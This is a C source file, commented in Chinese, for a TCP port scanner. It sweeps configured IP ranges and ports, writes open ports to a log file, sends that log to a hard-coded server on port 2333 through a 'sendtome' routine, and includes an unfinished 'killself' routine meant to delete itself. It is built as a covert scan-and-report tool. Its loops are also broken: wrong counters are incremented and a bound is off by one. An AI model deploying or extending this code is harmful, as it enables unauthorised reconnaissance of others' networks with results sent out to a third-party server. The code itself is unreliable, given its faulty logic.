#include "variables.h"		//配置头文件
#include <stdio.h>
#include <stdlib.h>
#include <sys/socket.h>
#include <time.h>
#include <unistd.h>
#include <sys/types.h>
#include <string.h>
#include <arpa/inet.h>
#define BUFFER_SIZE 1024

//======函数声明区=======
int test(char *ip,int port);
int iptonum(char *ip, int n);
void sendtome();
//===========================

int main(int argc,char** argv){
    init_();
    int num_host=0;
	clock_t time_start , time_end;
	FILE *jilu;
    jilu=fopen("./jilu","w");
	time_start=clock();
	//成组ip(ips[ ])的检测
	for(int i=0;i<num_ips;i++){
		char _ip[16];						//将ip的四段分割开，然后层层嵌套递增
		int ip_ed_1=iptonum(ips[i].end,1);
		int ip_ed_2=iptonum(ips[i].end,2);
		int ip_ed_3=iptonum(ips[i].end,3);
		int ip_ed_4=iptonum(ips[i].end,4);
		int ip_op_1=iptonum(ips[i].start,1);
		int ip_op_2=iptonum(ips[i].start,2);
		int ip_op_3=iptonum(ips[i].start,3);
		int ip_op_4=iptonum(ips[i].start,4);
		for(;ip_op_1<=ip_ed_1;i++){
			for(;(ip_op_2<=255)&&(ip_op_1<ip_ed_1)||(ip_op_1<=ip_ed_1);ip_op_2++){
				for(;(ip_op_3<=255)&&((ip_op_1<ip_ed_1)||(ip_op_2<ip_ed_2))||(ip_op_3<=ip_ed_3);ip_op_3++){
					for(;(ip_op_4<=255)&&((ip_op_1<ip_ed_1)||(ip_op_2<ip_ed_2)||(ip_op_3<ip_ed_3))||(ip_op_4<=ip_ed_4);ip_op_3++){
						sprintf(_ip,"%d.%d.%d.%d",ip_op_1,ip_op_2,ip_op_3,ip_op_4);		//将ip再组合起来
						for(int j=0;j<=num_ports;j++){			//端口自增
							for(int port_op=ports[j].start;port_op<=ports[j].end;port_op++){
								if(test(_ip,port_op)){
                                    fprintf(jilu,"\n %s\t%d",_ip,port_op);
                                    num_host++;
								}
							}
						}
						for(int j=0;j<num_port;j++){
                            if(test(_ip,port[j])){
                                fprintf(jilu,"\n %s\t%d",_ip,port[j]);
                                num_host++;
                            }
						}
					}
					ip_op_4=0;

				}
				ip_op_3=0;
			}
			ip_op_2=0;
        }

	}
    //单个ip(ip[ ])的检测
    for(int i=0;i<num_ip;i++){
        for(int j=0;j<num_ports;j++){			//端口自增
            for(int port_op=ports[j].start;port_op<=ports[j].end;port_op++){
                if(test(ip[i],port_op)){
                    fprintf(jilu,"\n %s\t%d",ip[i],port_op);
                    num_host++;
                }
            }
        }
        for(int j=0;j<=num_port;j++){
            if(test(ip[i],port[j])){
                fprintf(jilu,"%s\t%d\n",ip[i],port[j]);
                num_host++;
            }
        }
    }
    time_end=clock();
    //写入共扫描到的存活主机数和扫描所用时间
    fprintf(jilu,"\n find %d hosts \n use %f s",num_host,(float)(time_end-time_start));
    sendtome();
	return 0;
}

/*=====test函数===================================
传入一个ip和要测试的端口
对此ip的该端口的开放性进行测试，可用返回1,不可用返回0
=================================================*/
int test(char *ip,int port){
	struct sockaddr_in to;		//sockaddr_in
     int socket_t;                          //用于储存套接字的描述符(test)
    socket_t = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP); //构建TCP套接字,用来监听（listen）
	to.sin_family=AF_INET;
    to.sin_addr.s_addr=inet_addr(ip);
	to.sin_port=htons(port);		//to.sin_port要求必须要采用网络数据格式,普通数字可以用htons()函数转换成网络数据格式的数字
	if(connect(socket_t,(struct sockaddr *)&to,sizeof(struct sockaddr))==0){					//进行连接测试
		close(socket_t);
		return 1;
    }
    close(socket_t);
    return 0;
}
/*========iptonum===================================
传入ip的首地址和n，将其第n组数转化为int型数据，并返回该数据
1  9  2  .  1  6  8  .  1  0  0   .   1   7   1
0  1  2  3  4  5  6  7  8  9  10  11  12  13  14
=====================================================*/
int iptonum(char *ip, int n){
	char num[4];
	for(int i=0;i<=2;i++){
		num[i]=*(ip+(n-1)*4+i);
	}
	num[3]='\0';
	return atoi(num);

}
/*=======sendtome()===============
把记录文件发送回自己的服务器
============================*/
void sendtome(){
    int me_socket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP); //构建TCP套接字
    struct sockaddr_in me;
    char buffer[BUFFER_SIZE];
    bzero(&me, sizeof(struct sockaddr_in));
    me.sin_family=AF_INET;  //TCP
    me.sin_addr.s_addr=inet_addr(myip);    //设置IP地址,myadd在variables.h文件里定义好
    me.sin_port=htons(2333);    //定义端口~这个端口应该没人用吧~~

    if(connect(me_socket,(struct sockaddr*)&me,sizeof(struct sockaddr))<0){
        return ;
    }//与自己的主机链接
    FILE *jilu=fopen("./jilu","r"); //打开记录文件,开始传输
    int length;
    while((length=fread(buffer,sizeof(char),BUFFER_SIZE,jilu))>0){
        write(me_socket,buffer,length);
    }
    fclose(jilu);
    close(me_socket);

}

void killself(){
    //用于删除自身
    //不会呀。。。。。。。。55555555～
}









